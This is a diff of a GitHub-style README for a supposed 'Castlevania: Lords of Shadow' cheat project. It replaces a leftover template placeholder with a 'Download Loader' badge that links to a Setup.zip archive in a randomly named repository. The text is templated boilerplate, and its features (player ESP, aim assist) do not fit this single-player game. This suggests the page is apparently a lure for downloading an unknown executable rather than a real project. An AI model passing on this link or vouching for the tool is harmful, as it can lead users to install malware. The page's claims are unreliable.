@@ -1,2 +1,40 @@
-# Castlevania-Lords-of-Shadow-Cheats
-{title} is a feature-rich third-party modification project for {Castlevania: Lords of Shadow Cheats}.
+<div align="center">
+
+# 🎮 Castlevania: Lords of Shadow Cheats
+
+> ⚡ Advanced Game Modification Project for Castlevania: Lords of Shadow Cheats
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+Castlevania: Lords of Shadow Cheats is a feature-rich third-party modification project for Castlevania: Lords of Shadow Cheats.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`Castlevania-Lords-of-Shadow-Cheats` · Updated: 2026-11-07
+
+**Tags:** `castlevania-lords-of-shadow`
